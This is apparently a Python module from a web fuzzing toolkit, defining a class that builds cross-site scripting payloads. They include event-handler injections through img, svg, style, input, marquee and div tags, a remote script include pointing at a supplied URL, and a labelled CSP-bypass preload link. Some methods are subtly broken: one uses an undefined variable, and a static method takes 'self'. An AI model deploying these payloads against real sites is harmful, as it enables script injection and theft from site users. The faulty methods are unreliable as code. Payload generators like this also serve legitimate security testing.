#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """generate XSS payload"""

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return "<script>alert(/xss/)</script>"

    def img(self):
        return '<img/onerror="%s"/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload="%s"/>' % payload

    def style(self, payload):
        return '<style/onload="%s"></style>' % payload

    def input(self, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url
